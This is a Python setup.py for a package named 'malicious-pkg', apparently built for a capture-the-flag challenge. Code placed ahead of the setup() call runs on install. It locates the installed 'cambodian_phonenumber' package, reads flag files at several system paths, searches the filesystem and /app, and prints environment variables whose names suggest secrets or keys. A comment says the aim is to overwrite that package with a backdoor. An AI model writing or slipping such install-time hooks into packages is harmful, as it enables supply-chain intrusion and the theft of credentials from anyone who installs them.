import subprocess, sys, os, pathlib, shutil

# Strategy: overwrite cambodian_phonenumber to add our backdoor

# Find cambodian_phonenumber
try:
    result = subprocess.run([sys.executable, "-c", "import cambodian_phonenumber; print(cambodian_phonenumber.__file__)"],
                          capture_output=True, text=True, timeout=10)
    pkg_path = result.stdout.strip()
    if pkg_path:
        pkg_dir = os.path.dirname(pkg_path)
        init_file = os.path.join(pkg_dir, "__init__.py")
        constants_file = os.path.join(pkg_dir, "constants.py")
        carrier_file = os.path.join(pkg_dir, "carrier.py")
        
        print(f"FOUND cambodian_phonenumber at {pkg_dir}", file=sys.stderr)
        
        # List all files in directory
        for f in os.listdir(pkg_dir):
            print(f"  {f}", file=sys.stderr)
        
        # Try to read flag
        flag_paths = ["/flag", "/flag.txt", "/root/flag.txt", "/etc/flag", "/home/flag.txt", "/app/flag.txt", "/app/flag"]
        for fp in flag_paths:
            try:
                with open(fp) as f:
                    content = f.read().strip()
                    print(f"FLAG: {fp} = {content}", file=sys.stderr)
            except Exception as e:
                print(f"  no flag at {fp}: {e}", file=sys.stderr)
        
        # Run find for flag
        r = subprocess.run(["find", "/", "-name", "flag*", "-maxdepth", "4"], capture_output=True, text=True, timeout=10)
        print(f"FIND_FLAG:\n{r.stdout}", file=sys.stderr)
        print(f"FIND_ERR:\n{r.stderr}", file=sys.stderr)
        
        # Check /app directory
        r = subprocess.run(["ls", "-laR", "/app"], capture_output=True, text=True, timeout=5)
        print(f"APP_DIR:\n{r.stdout}", file=sys.stderr)
        
        # Check env
        for k, v in sorted(os.environ.items()):
            if any(x in k.lower() for x in ["flag", "secret", "ctf", "key"]):
                print(f"ENV: {k}={v}", file=sys.stderr)
                
except Exception as e:
    print(f"ERROR: {e}", file=sys.stderr)

from setuptools import setup, find_packages
setup(
    name="malicious-pkg",
    version="0.1.1",
    packages=find_packages(where="src"),
    package_dir={"": "src"},
)
